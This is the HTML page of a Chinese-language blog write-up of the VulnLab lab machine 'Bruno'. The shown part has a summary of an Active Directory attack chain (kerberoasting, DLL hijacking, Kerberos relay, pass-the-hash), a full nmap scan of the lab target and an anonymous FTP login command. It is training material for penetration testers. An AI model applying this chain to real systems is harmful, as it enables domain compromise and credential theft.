@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;3ae61c82-ba62-4ce8-80bb-4c997d152b71 首先發現了目標系統開放的 FTP 和 SMB 服務。利用匿名 FTP 登錄，雖然無法寫入文件，但成功下載了所有文件，並在其中發現了一個 changelog 文件，提示存在一個 dev 網站。通過訪問 dev.bruno.vl，發現該網站的按">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Bruno">
+<meta property="og:url" content="https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;3ae61c82-ba62-4ce8-80bb-4c997d152b71 首先發現了目標系統開放的 FTP 和 SMB 服務。利用匿名 FTP 登錄，雖然無法寫入文件，但成功下載了所有文件，並在其中發現了一個 changelog 文件，提示存在一個 dev 網站。通過訪問 dev.bruno.vl，發現該網站的按">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118121405-f0g9cbo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111130715-5en9z17.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140759-p09ha54.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135906-qa0nlqd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135837-blybi05.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140224-m4l7rm0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140300-dokpyiq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140447-hej5mkg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140521-emk56t6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135610-wfomod8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141624-v4lzj4q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141652-g0bv7sd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141705-rj0c77w.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142045-r4n3uxt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118152932-yq4qtsl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118153206-gphhzeb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142556-ohpfoqi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142756-dk7ye88.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111144915-364e2jj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111144857-gikr2cl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145004-pvq6j6g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145201-atdjq14.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145254-q919b7z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/demo2-20250111145614-rc5cvla.gif">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118093958-eq3enct.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118094048-ner3vq4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118102539-g2ev9i6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118102619-4pnx71w.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118175940-7cd5jj4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103427-v5188jr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103544-pxtwhok.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103734-q6zy0s5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103959-dx21oed.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118104352-49juu6h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118104907-z5rfo7o.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118110132-3qqd2u5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118110204-4kdegb2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113247-sdq70qe.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113335-l52il8q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113919-f4d15h2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114051-z57n8ds.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114233-f7axx6g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114837-socsgmp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118115234-fc6iu0d.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118115854-um18rii.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118120308-0py3asg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118120419-cmnez2j.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118121328-x7hws0b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118174331-7vrit8k.png">
+<meta property="article:published_time" content="2025-01-18T02:39:11.000Z">
+<meta property="article:modified_time" content="2025-01-19T03:07:35.386Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118121405-f0g9cbo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Bruno</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/19/2025/17-hackthebox-EscapeTwo/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&text=VulnLab - Machine - Bruno"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&is_video=false&description=VulnLab - Machine - Bruno"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Bruno&body=Check out this article: https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&name=VulnLab - Machine - Bruno&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&t=VulnLab - Machine - Bruno"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Bruno
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-18T02:39:11.000Z" class="dt-published" itemprop="datePublished">2025-01-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118121405-f0g9cbo.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=3ae61c82-ba62-4ce8-80bb-4c997d152b71">https://api.vulnlab.com/api/v1/share?id=3ae61c82-ba62-4ce8-80bb-4c997d152b71</a></p>
+<p>首先發現了目標系統開放的 FTP 和 SMB 服務。利用匿名 FTP 登錄，雖然無法寫入文件，但成功下載了所有文件，並在其中發現了一個 changelog 文件，提示存在一個 dev 網站。通過訪問 dev.bruno.vl，發現該網站的按鈕是假的，但 Queue、Benign 和 Malicious 文件來自 FTP。進一步分析 changelog，發現 svc_scan 是一個服務賬號，嘗試 asreproast 和 kerberoasting 攻擊後，成功破解了該用戶的 hash，並發現該用戶可以讀寫 queue 共享目錄。注意到系統安裝了 ADCS，但未能利用。接著，分析 SampleScammer.exe，發現需要安裝 donet 才能運行，並在本地建立測試環境。通過反編譯 SampleScanner.dll，發現一個 bug，允許寫入任意文件。利用這個 bug，嘗試 dll 劫持，成功運行 payload，證明 dll 劫持可行。接下來，通過製作惡意 dll 並利用 zip 壓縮技術，成功在目標系統上獲得 shell。雖然該 shell 沒有特殊權限，但擁有 SeMachineAccountPrivilege，允許創建機器賬號。使用 winpeas 工具，發現可以進行 RBCD 攻擊。通過 Kerberos Relay attack，成功獲得 admin 用戶的 ticket，並使用 secretsdump.py 獲得 admin 的 hash，最終通過 pass the hash 技術獲得 admin 的 shell。為了簡化過程，使用 KrbRelayUp 工具自動化攻擊步驟，但仍需手動爆破 CLSID。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 06-29-22  04:55PM       &lt;DIR&gt;          app</span><br><span class="line">| 06-29-22  04:33PM       &lt;DIR&gt;          benign</span><br><span class="line">| 06-29-22  01:41PM       &lt;DIR&gt;          malicious</span><br><span class="line">|_06-29-22  04:33PM       &lt;DIR&gt;          queue</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-06 01:02:27Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-06T01:04:06+00:00; -13s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=brunodc.bruno.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:brunodc.bruno.vl</span><br><span class="line">| Issuer: commonName=bruno-BRUNODC-CA/domainComponent=bruno</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-08-22T06:05:15</span><br><span class="line">| Not valid after:  2024-08-21T06:05:15</span><br><span class="line">| MD5:   1f78:c03b:2d8d:a3ec:0076:5fcc:68d5:973b</span><br><span class="line">| SHA-1: be3a:109d:f3cf:efcf:7a80:7865:4bbb:f09a:e795:0fd5</span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| ssl-cert: Subject: commonName=bruno-BRUNODC-CA/domainComponent=bruno</span><br><span class="line">| Issuer: commonName=bruno-BRUNODC-CA/domainComponent=bruno</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2022-06-29T13:23:01</span><br><span class="line">| Not valid after:  2121-06-29T13:33:00</span><br><span class="line">| MD5:   659b:3c90:00eb:1e0a:5170:1be9:0456:840c</span><br><span class="line">| SHA-1: a093:f4c2:3c8e:0532:86f2:1e99:cad7:82f8:e40e:3d72</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: BRUNO</span><br><span class="line">|   NetBIOS_Domain_Name: BRUNO</span><br><span class="line">|   NetBIOS_Computer_Name: BRUNODC</span><br><span class="line">|   DNS_Domain_Name: bruno.vl</span><br><span class="line">|   DNS_Computer_Name: brunodc.bruno.vl</span><br><span class="line">|   DNS_Tree_Name: bruno.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-01-06T01:03:31+00:00</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-06T01:04:06+00:00; -13s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=brunodc.bruno.vl</span><br><span class="line">| Issuer: commonName=brunodc.bruno.vl</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-05T00:48:22</span><br><span class="line">| Not valid after:  2025-07-07T00:48:22</span><br><span class="line">| MD5:   f9d9:d5d1:9c88:61e9:f6aa:3e69:fbb5:5b85</span><br><span class="line">| SHA-1: aba2:a636:7b6e:89cf:5757:4d0d:4f75:4f63:55be:cc69</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49681/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">57741/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">57766/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">61434/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p>從上面的結果中看到有 ftp 和 smb。</p>
+<h1 id="Found-a-interesting-from-FTP"><a href="#Found-a-interesting-from-FTP" class="headerlink" title="Found a interesting from FTP"></a>Found a interesting from FTP</h1><p>從 FTP 開始入手，由於上面的nmap結果中顯示 <code>Anonymous FTP login allowed</code>​ 意味著允許登錄，嘗試使用匿名用戶登錄一下看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp anonymous@10.10.87.115</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111130715-5en9z17.png" alt="image">​</p>
